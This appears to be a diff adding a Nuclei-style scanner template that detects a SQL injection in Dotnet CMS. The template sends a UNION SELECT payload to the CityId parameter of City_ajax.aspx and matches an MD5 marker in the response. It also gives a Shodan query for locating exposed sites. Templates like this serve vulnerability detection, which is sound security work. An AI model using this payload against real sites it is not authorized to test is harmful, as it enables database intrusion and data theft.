@@ -1,0 +1,38 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - '{{md5("{{randstr}}")}}'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/user/City_ajax.aspx?CityId=33''union%20select%20sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{randstr}}'')),2--'
+id: dotnetcms-sqli
+info:
+    author: ritikchaddha
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-89
+    description: Dotnet CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+    metadata:
+        max-request: 1
+        shodan-query: http.html:"dotnetcms"
+        verified: true
+    name: Dotnet CMS -  SQL Injection
+    reference:
+        - https://www.cnblogs.com/rebeyond/p/4951418.html
+        - http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0150742
+    severity: critical
+    tags:
+        - dotnetcms
+        - dotnet
+        - intrusive
+        - NETCMS
+        - TCMS
+        - DotNetCMS
+        - dotNETCMS
